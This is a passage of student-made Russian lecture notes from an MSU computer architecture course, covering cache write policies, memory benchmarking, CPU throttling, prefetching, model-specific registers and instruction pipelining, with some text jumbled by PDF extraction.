      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Кэш прямого отображения.
    Есть несколько видов кэша. Кэш прямого отображения является самым простым. В
каждом наборе ровно по одной строке. Каждый блок внутри кеша имеет только одно место,
где может храниться.

   • Если тэг совпал и данный валидные, то отсчитываем смещение в блоке.

   • Если тэг не совпал, эта строчка вытесняется из кэша, нужный блок из памяти
                                                                      © 2021 МГУ/ВМК/СП
     загружается, поле ”тэг”запишется в соответствующее поле внутри строки.

                                       Производительность SSD
Моделируем кэш прямого отображения. Пусть есть M=16 адресуемых байтов, B=2
байта в блоке, S=4 наборов, E=1 блок в наборе

    Последовательное чтение                   250 МБ/с          Последовательная запись         170 MB/s
    Произвольное чтение                       140 МБ/с          Произвольная запись             14 MB/s
    Время доступа                             30 мкс            Время старта записи 300 мкс

                                                   Рис. 22.16: Тупики
       • Причины малой скорости произвольной записи
                  – Высокая длительность стирания блока ( ≈1 мс.)
   • Если запросить данные с нулевого адреса, адрес распадется на 3 поля и произойдет
          – Запись
     ”холодный       одной
               промах”. Блокстраницы
                             копируется,вызывает     копирование всех
                                         тэг обновляется.
                         остальных страниц, расположенных в данном блоке
   • Затем просходит попадаение
              • Выделить (найти) новый блок и стереть его содержимое
                             • Записать страницу в новый блок
                             • Скопировать остальные страницы из исходного блока


                                                                                                          28




                                  Рис. 22.17: Моделирование кэша прямого отображения




                                                          247
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 23. Работа кэша. Количественные характеристики
работы компьютера
Запись в кэш
   Многоуровневость памяти несколько усложняет процедуру записи в данных в память.

   • Выбор, как будут храниться копии данных на разных уровнях кэша. Несколько
     копий данных: – L1, L2, L3, оперативная память, диск – В многоуровневом кэше
     приходится решать, хранить ли копии данных на разных уровнях. В современных
     компьютерах кэш может быть

            – эксклюзивным , когда на каждом уровне данные хранятся без пересечения. Т.е.
              на одном из уровней размещена единственная копия данных.
            – инклюзивным, когда считанные из памяти данные размещаются на каждом
              уровне. Т.е. на каждом уровне имеется своя копия.

   • В случае попадания в какой-то уровень кэша, записывать данные можно по-разному:

            – Сквозная запись (пишем в память незамедлительно);
            – Отложенная запись (откладываем до момента вытеснения строки). Более
              быстрое обращение на запись, но появляется некоторая рассогласованность
              данных, т.е. в кэше уже есть, а в память еще не записали. В строке кэша нужен
              бит, говорящий о том, что данные уже различаются

   • Промах:

            – Запись с размещением в кэше. Эффективно когда выполняется несколько
              записей в последовательные адреса
            – Запись в память напрямую без размещения в кэше

   • Типичные комбинации политик управления кэшем

            – Сквозная запись + Запись без размещения
            – Отложенная запись + Запись с размещением

   Эти стратегии друг друга дополняют и позволяют сохранить эффективность работы
иерархической памяти не только на чтении, но и на записи.

   Рассмотрим память современного процессора. На кристалле присутствуют
4 ядра. Ядро – фактически самостоятельный процессор, который состоит из
регистров, арифметико-логического устройства, управляющего устройства. Помимо


                                             248
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




регистров(самой быстрой памяти) присутствуют еще несколько уровней кэша, которые
связаны с конкретным ядром.
   L1 и L2 принадлежат отдельному ядру. Заметим, что нарушается один из принципов
фон Неймана. На уровне L1 идет явное разделение памяти: память, которая хранит
данные (d-кэш) и память, которая хранит инструкции (i-кэш). В L2 код и данные
хранятся вместе. L3 – общий для всех ядер. Если в одном ядер произошло изменение,
информация должна быть доставлена в кэш других ядер. Время от времени данные из
кэш сбрасываются в память.




                                  Рис. 23.1: Иерархия кэшей в Intel Core i7

   Время обращения при спуске по уровням нарастает. Размер блока на всех уровня кэша
одинаковый.


Метрики производительности кэша
   • Основная метрика, которая показывает качество работы кэша, завязанная на
     аппаратную часть – коэффициент промахов. Она показывает долю промахов
     от общего числа обращений. Показывает выигрыш от реализации комбинаций
     политик работы кэша.
     характерные показатели:

            – 3-10% для L1
            – <1% для L2. Чем больше кэш, тем меньше коэффициент.

   • Время попадания.




                                                    249
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




            – Длительность извлечения данных из кэша. При обращении в кэш необходимы
              вспомогательные действия для выяснения наличия и местоположения данных.
            – Характерные показатели: 1-2 тактов для L1 и 5-20 тактов для L

   • Накладные расходы при промахе. Дополнительное время из-за промаха

            – Обычно 50-200 тактов для обращения к памяти

Из за разницы в два порядка для времени промахов и попаданий небольшое изменение(с
99% до 97%) показателя попаданий уменьшит эффективность работы программы в два
раза. Примем, что время попадания – 1 такт, а накладные расходы при промахе 100 тактов.
Среднее время доступа к элементу кэша:
   – 97% попаданий: 1 такт + 0.03 * 100 тактов = 4 такта
   – 99% попаданий: 1 такт + 0.01 * 100 тактов = 2 такта
   Коэффициент неудач – показатель, связанный с промахами. Более наглядно
показывает связь увеличения времени работы программы с количеством промахов.
   Дружественный к кэшу код. Программа во многом определяется тем, нассколько
дружественный кэшу код удается построить.

   • тела вложенных циклов, часто вызывающиеся функции значительно влияют на
     общее время работы программы.

   • минимизировав промахи при обращении к кэшу в теле вложенного цикла,
     добившись в них локальности временной и пространственной локальности,
     можно улучшить время программы. – Повторяющеюся обращения к одним и
     тем же переменным (временная локальность) – Проход по массиву с шагом 1
     (пространственная локальность)


Способы оценки производительности компьютеров и программ
   Рассмотрим различные аспекты оценки скорости работы и производительности. Это
оценка
   - Всего компьютера в целом
   – Отдельных компонент
   – Генерируемого компилятором кода

   Измерения произовдительности зависят не только от свойств аппаратуры, но и от того,
какие программы будут выполняться. Для оценки производительности есть специальные
программы –бенчмарки.
   Бенчмарк – задача, служащая эталонным тестом производительности вычислительной
системы.



                                            250
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Классификация
   – Синтетические / основанные на реальных приложениях(для оценки компьютера в
целом, дают более общую картину)
   – Микробенчмарк (оценивает характеристики отдельных компанент)
   Индустриальные бенчмарки

   • SPEC: Standard Performance Evaluation Corporation. Стандартный набор тестов для
     тех, кто пишет компилляторы.
     • Некоммерческая организация, занимающаяся разработкой стандартизированных
     бенчмарков для оценки производительности и энергоэффективности
     вычислительных систем. Бенчмарк для ЦПУ - SPEC CPU 2017.

   • ScaLAPACK (Scalable Linear Algebra PACKage) – библиотека с открытым исходным
     кодом, используется для оценки производительности компьютеров с массивно-
     параллельной архитектурой (например, суперкомпьютеры).
     • Решение систем линейных уравнений, обращение матриц, ортогональные
     преобразования, поиск собственных значений и др.


Аппаратные средства измерения времени.
   В процессоре Pentium появился регистр 64-разрядный регистр TSC, подсчитывающий
количество выполнившихся тактов с момента включения компьютера. Зная заявленную
тактовую частоту, можно пересчитать это число тактов во время выполнения. Опросить




                                  Рис. 23.2: Измерение времени

регистр можнокомандой rdtsc. Инструкция rdtsc считывает значение регистра TSC и
заносит его в пару регистров EDX:EAX
   Выполнение команды rdtsc может быть недоступна пользователям на некоторых
системах.



                                              251
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Оценка производительности памяти:                                    синтетический                бенчмарк
(контрольная задача)
   Хотим измерить длительность обращения в память, чтобы можно быть оценить
пропускную способность системы памяти. Выполняется оценочная функция, внутри




                                  Рис. 23.3: Измерение длительности обращения в память

которой присутствует цикл for. Внутри этого цикла мы с некоторым шагом проходим по
массиву data. Шаг и размер массива могут варьироваться.
   Вызов оценочной функции:

   • Для того, чтобы разогреть кэш, выполняетcя функция test.

   • Далее из функции-болочки будем вызывать функцию test, указывая ей количество
     элементов, которые нужно перебрать и шаг, с которым будет проходить.

   • Пересчитывается количество выполнившихся циклов в то время, которое
     потребовалось для извлечения данных из памяти. Будут учитываться накладные
     расходы, связанные с вызовом функции, накладные расходы на выполнение цикла.

   • После выполнения бенчмарка, варьируя размер и шаг, с которым мы ходим по
     массиву, получаем следующую картинку.

   При нарастании данных пропускная способность растет. При достаточном количестве
данных они будут хранится в кэше L1, и пропускная способность вырастет. Она будет
находится на это уровне, пока размера кэша будет достаточно. Когда начнутся промахи в
кэш, пропускная способность будет падать на порядки.


                                                          252
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU
                                                               © 2021 МГУ/ВМК/СП




                                                                      10


  Рис. 23.4: Зависимость пропускной способности от размера шага и размера данных.

   При увеличении шага ухудшается локальность, и пропускня способность начинает
деградировать.

   Рассмотрим картинку, сделанную на более современном процессоре. Простой, ранее




  Рис. 23.5: Зависимость пропускной способности от размера шага и размера данных.

рассмотренный бенчмарк на настольных компьютерах и серверах последних поколений
показывает «парадоксальные» графики пропускной способности памяти : пропускная
способность изначально крайне мала и начинает расти с увеличением объема данных.
Такой эффект появился из-за того, что некоторые факторы были не учтены.

   • В современных компьютерах появился механизм проска тактов. Пропуск тактов


                                       253
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     процессора (дросселированивание тактов, CPU throttling) – механизм снижения
     тактовой частоты процессора.

            – Энергопотребление процессора:

                                                  𝑃 ≈ 𝐶»𝑉 2 » 𝑓 ,

                  где С – элекр. емкость, V – питающее напряжение, f – частота
            – Снижение частоты          снижает    энергопотребление,            а    следовательно,          и
              энерговыделение.

     ⇒ Защита от перегрева. Чтобы предотвратить физическое сгорание, встроенные
     механизмы сбрасывают тактовую частоту.
     ⇒ Экономия энергии, когда компьютер не занят выполнением программ,
     требующих всех вычислительных возможностей.

   • Современные процессоры способны динамически менять свою тактовую частоту,
     но и по умолчанию дросселируют такты.

            – Снижение и восстановление частоты происходит не мгновенно, оно занимает
              сотни миллисекунд
            – Быстро отработавший бенчмарк не успевает дождаться восстановления
              штатной частоты процессора

     Когда мы начинаем выполнять тест, разогрели кэш, но дросселирование тактов
     еще не вывело нас на нужную тактовую частоту. Чтобы с этим справиться, можно
     наращивать время разогрева, либо можно отключить дросселирование (см. рис.
     23.6).

Пропуск тактов отключен. На графике исчезли «зубцы» и виден правильный искомый
спад при наращивании шага. Но «правильный» перепад в пропускной способности
памяти так и не появился. Это может объяснить тем, что остались и другие неучтенные
факторы. Эти факторы определяют микроархитектуру процессора.


Микроархитектура процессора, ее связь с другими архитектурными
уровнями.




                                                  254
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Рис. 23.6: Зависимость пропускной способности от размера шага и размера данных в
случае отключенного дросселирования.


 Архитектура набора команд – интерфейс,
 который определяет, что могут делать
 программы
 Микроархитектура определяет, как это
 будет выполняться.
 Разработчики    аппаратуры    стремятся
 сохранить совместимость ISA и развить
 возможности микроархитектуры:

    • (Обратная)     совместимость  –
      возможность      выполнять   на
      новых моделях процессора ранее
      написанные программы без каких- Рис. 23.7: Микроархитектура процессоров
      либо изменений


   • ISA можно дополнить новыми командами

   • Развитие микроархитектуры улучшает важные для пользователя свойства
     процессора

            – Производительность
            – Энергопотребление
            – Безопасность



                                      255
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




            – ...

    Изменения микроархитектуры не влияют на архитектуру набора команд. При этом
обеспечивается совместимость, т.е. на разных процессорах с разной микроархитектурой
можно запускать одни и те же программы.
    Упреждающая выборка данных
    Используемый бенчмарк обращается за данными строго последовательно, хоть и с
различным шагом. Таким образом, для процессора становится возможным предсказывать,
за какими данными будут обращения в будущем (упреждающая выборка).
    Упреждающая выборка – микроархитектурный механизм для повышения
производительности за счет извлечения инструкций и/или данных из памяти в кэш
до того, как они фактически потребуются. В идеальном случае сможем получать
пиковую производительность всех архитектурных решений на ровне шины, организации
динамической памяти и т.д. В той модели процессора, на которой запускался бенчмарк,
аппаратно реализовано 4 различных алгоритма упреждающей выборки.
    ⇒ При таком регулярном обращении, когда мы просто проходим по массиву, померять
пропускную способность очень тяжело.


Пропускная способность vs. Латентность
   Попробуем измерить другую характеристику системы памяти, которую труднее
«спрятать» микроархитектурными решениями.
   Пропускная способность памяти – объем данных, который может быть передан из
памяти за единицу времени. Если построить аналогию с трубопроводом – это ширина
трубы.

   Микроархитектурные решения стремятся приблизить эту характеристику к пиковой
величине

   • Совокупность решений: расслоение памяти, многоканальность, многоуровневое
     кэширование, упреждающая выборка, …

   • Хорошо работают при «предсказуемых» обращениях в память, таких как
     последовательный проход .

   • Ограничениями становятся пропускные способности шин и модулей памяти.

   Латентность (задержка) – время, которое затрачивается на чтение из памяти
минимальной порции данных (одного слова). В примере с трубой – это длина
трубопровода
   Для оценки требуется обращаться в память по случайным адресам



                                       256
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   ⇒ Заметим, что пропускная способность и латентность – относительно независимые
друг от друга характеристики


Оценка латентности памяти на синтетическом тесте.
   Нужно поменять синтетический микробенчмарк, который будет использоваться.
Вместо массива берется однонаправленный список, в котором будет находится поле
payload, к которому мы будем обращаться, и указатель, который ведет на следующий
элемент списка.
   Измеряется время, затрачиваемое на проход по однонаправленному списку

  1. Элементы списка размещаются в памяти последовательно

  2. Список «перемешивается», каждый элемент ссылается на другой в произвольном
     порядке. Это будет гарантированно приводить к промахам в кэш и мешать
     алгоритмам упреждающей выборки.

  3. Для снижения погрешностей измерения времени по небольшим спискам проходят
     несколько раз

Попытаемся измерить время доступа для списков разных размеров

  1. Проход по «перемешанному» списку

  2. Последовательный проход по списку

  3. Последовательный проход с отключенной упреждающей выборкой




Рис. 23.8: а) Время прохода по однонаправленному списку. б) Время доступа для списков
разных размеров

   Задача – сделать измерения для случая включенной упреждаюзей выборки и для
случая выключенной упраждаюзей выборки.




                                        257
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Отключение упреждающей выборки.
   Каждая модель процессора может иметь свои микроархитектурные особенности.
Управлять ими через специализированные команды – крайне неудобно для разработчиков
процессора, придется постоянно дорабатывать ISA. Проще организовать управление
через специальный набор управляющих и статусных регистров (Model specific register,
MSR)
   Моделезависимые регистры (MSR) – это еще одно логическое пространство, с
которым можно работать. Если основное пространство памяти – физическая память,
другое пространство – порты ввода/вывода, третье пространство – Моделезависимые
регистры.

   • Обращение к регистру по его номеру

   • Для работы с регистрами есть комнды чтения/записи – команды RDMSR и WRMSR.
     Они могут выполняться только операционной системой

   • Разработчики процессоров имеют право свободно менять состав и поведение
     регистров от модели к модели

   • На некоторые MSR доступна документация

   • В Linux обратиться к MSR можно через специальные утилиты, названия которых
     повторяют имена соответствующих машинных команд

   У используемой автором слайдов модели процессора упреждающая выборка
управляется MSR 0x1a4.
   Если выполнить все подготовительные действия и програть новый бенчмарк,
увеличивая размер списка, получим похожие на теорию три графика (см. рис. 23.9).
   Для последовательного прохода по списку видно, что только когда данные перестают
попадать в кэш, появляется небольшой прирост. Дальше упреждающая выборка
позволяет сохранять неплохую латентность.
   Если обращаться в память в случайном порядке, видно, как происходит рывок и время
доступа увеличивается. Время стабилизируется пока данные находятся внутри кэша 3
уровня. Затем время увеличивается до 100 нс.
   Последовательный проход с отключенной предвыборкой оказывается посередине.

   Выводы.

   • Измерение даже простых характеристик компьютера требует учета многих
     факторов, без гарантий, что про все эти факторы найдется информация в открытых
     источниках (зеленая линия на графике). Эти микроархитектурные решения могут
     искажать или выворачивать наизнанку некоторую теоретическую картину.


                                        258
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU


                                                                                                    © 2021 МГУ/ВМК/СП
   Intel Pentium
   G4560 @ 3.50 ГГц                                          ● Обращения в память в случайном порядке
   8 ГБ оперативной памяти                                   ● Последовательный проход по списку
                                                             ● Последовательный проход по списку
                                                               с отключенной предвыборкой данных

                                  L1 – 32 КБ   L2 – 256 КБ     L3 – 3 МБ




                                                                               19
Рис. 23.9: Зависимость времени доступа от размера списка для случая, когда прпуск тактов
   Пропуск тактов отключен
отключен


            – Отключены только пропуск тактов и упреждающая выборка. Последовательные
              обращения памяти замедлились на порядок, но все еще на порядок быстрее,
              чем обращения к произвольным адресам.

   • Если в разрабатываемой программе несколько теряется требуемая характеристика
     локальности, современный компьютер способен этот огрех подчистить и все равно
     выдавать хорошую скорость работы.

   • Регулярные, последовательные, обращения к памяти могут сохранять высокую
     пропускную способность и латентность даже при потере локальности, благодаря
     комплексу дополняющих друг друга микроархитектурных решений (синяя линия
     на графике)

   • Латентность памяти скрыть гораздо тяжелей по ряду причин

            – В частности, потому что память физически удалена от процессора
            – Пример: 1ГГц, длительность 1 такта
            – 1 нс. За это время световой сигнал в вакууме успеет распространиться
              примерно на 30 см.



                                                             259
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




            – Скорость распространения электрического сигнала в меди – 60-90% скорости
              света
            – Необходимо передать в память команду на считывание, строб строки, строб
              столбца, получить обратно данные, …

   • Если данные не умещаются в кэш, то длительность произвольных обращений к ним
     микроар


Микроархитектурные решения
   • Конвейер команд работающих конвейеров

            – Суперскалярная архитектура
            – Несколько параллельно

   • Многоуровневое кэширование

            – Отдельные кэши для кода и данных

   • Многоядерность

   • Предсказание передачи управления (переходов)

   • Упреждающая выборка кода и данных

   • Микрокод

   • Внеочередное выполнение команд


Конвейерная обработка команд, проблемы конвейерной обработки
   Конвейер – совмещение разных действий в один момент времени. Аналогия с
эскалатором: можно перевозить одного человека за раз, либо можно сделать много
ступенек, и на каждой ступеньке будет стоять один человек. Вдремя доставки из
одной точки в другую нельзя, но можно каждый временной интервал (меньше времени
доставки) получать выходящего человека. Чем меньше ступени(больше людей), тем
больше пропускная способность.
   • Общая для различный предметных областей методика
   • Длительность обработки неизменна или несколько увеличивается
   • Увеличение пропускной способности

   Упрощенная схема работы конвейера x86 состоит из пяти этапов(их может быть
больше в реальных процессорах):


                                           260
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




  1. (Fet) Извлечение инструкции из памяти

  2. (Dec) Декодирование, обновление EIP

  3. (D-F) Извлечение данных, подготовка операндов к выполнению операции

  4. (Exe) Непосредственное выполнение операции

  5. (Wrt) Запись результата

   При реализации идеи конвейерных вычислений, можно столкнуться с определенными
проблемами и ограничениями физического уровня.

                                                                                                                         © 2021 МГУ/ВМ
    Организация конвейерных вычислений В отсутствии конвейера все вычисления
проходят некоторую логическую схему, на что требуется некоторое количество времени,
                                           Организация конвейерных вычислений
после чего сохраняются внутри некоторого регистра на некоторое время. Задерка работы
для такой системы 320 пс. Полусим пропускную способность 3.12 GIPS (Giga Instructions
Per Second).
                                                               Задержка 320пс
                                                               Пропускная способность 3.12 GIPS

                                                                                                     © 2021 МГУ/ВМК/СП




                                  Организация
                                   Рис. 23.10: Обычная конвейерных
                                                       схема для вычисленийвычислений

   Раздробим логическую схему на равные куски. При делении на 3 части каждый такой
кусочек будет отрабатывать за 100 пс, но потребуются    промежуточные
                                                      Задержка 320пс регичстровые
станции ( еще 20 пс). За счет дробления появляется необходимость    в промежуточном
                                                      Пропускная способность 3.12 GIPS
сохранении результатов. Общая задержка возрастает до 360 пс. Но каждые 120 пс на
                                                          Задержка 360пс
                      Для временного
выходе получаем очередную             хранения
                            завершившуюся    команду. пропускная способность выросла
                      результатов работы каждой
                                                          Пропускная  способность 8.33 GIPS
до 8.33 GIPS.
                                   логической схемы требуются                                                                   24
                                   служебные регистры




                              Рис. 23.11: Схема для конвейерных вычислений
                                                          Задержка 360пс
                      Для временного хранения
                      результатов работы каждой
                                                          Пропускная способность 8.33 GIPS
          логической схемы требуются                                            24
          служебные  регистры
   Неоднородность ступеней конвейера. Всегда удается разбить конвейер на равные
по времени работы части. Выравнивать время работы придется по самой длинной


                                                     261
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




ступени(см. рис. 23.12). В силу того, что на каждом такте теперь требуется по 170 секунд,
                                                                                      © 2021 МГУ/ВМК/СП

задержка будет 510 пс, а пропускная способность уменьшится до 5.88 GIPS.
                                          Неоднородность ступеней конвейера




                                                            Задержка 510пс
                                                            Пропускная способность 5.88 GIPS




                                                                                             25

                                  Рис. 23.12: Конвейер с неоднородными ступенями

   Проблемы конвейерной организации.

   • Опустошение конвейера: сброс промежуточных результатов уже выполняющихся в
     конвейере команд.

            – Современные процессоры могут содержать конвейеры длины 15 и более (P4
              Prescott – 31 стадия конвейера)
            – Изменение EIP сбрасывает                     промежуточные                           результаты   выполнения
              следующих инструкций
            – Возникновение исключительной ситуации при обращении к памяти или при
              выполнении операции над данными

   • Зависимости по данным между «близко» расположенными командами

   • Остановки из-за обращения к памяти

   Опустошение конвейера при передаче управления. При последовательной выборке
команд выбрали, декодировали и дальше выполняем сравнение, затем условную передачу
управления. Только когда понятно, куда перепрыгиваем или не перепрыгиваем, в конвейре
уже будут находится извлеченные, декодированные и выполняющиеся следующие четыре
команды. Когда становится понятно, что нужно перепрыгнуть вперед, все эти четыре
команды нужно выбросить. Стараемся предсказать, куда будет переход. Своего рода
техника кэширования.
   Приостановка конвейера. Некоторые команды могут обращаться к памяти. Если
происходит промах, надо долго ждать, когда данные будут загружены. Пока они не
поступили в процесс, конвейер останавливается.
   Бывает, что в одной команде нужно обновить регистр, а в другой команде мы должны
им пользоваться. Внутри аппаратной реалиации процессора сделать bypass заготовки, в
которые записываются текущее значение до записи. Оно одновременно уже идет внутрь


                                                         262
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                  управления
Архитектура ЭВМ и язык ассемблера                                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                         Рис. 23.13: Опустошение конвейера при передаче управления
                                                                                                      27
схем, которые начинат выполнять следующую команду. Это приводит к усложнению
внутренней логики процессора.

   Двойной конвейер. В середине 90-х годов было предложено сделать несколько
экземпляров конвейеров. Если в очереди выборки оказывалась последовательность из
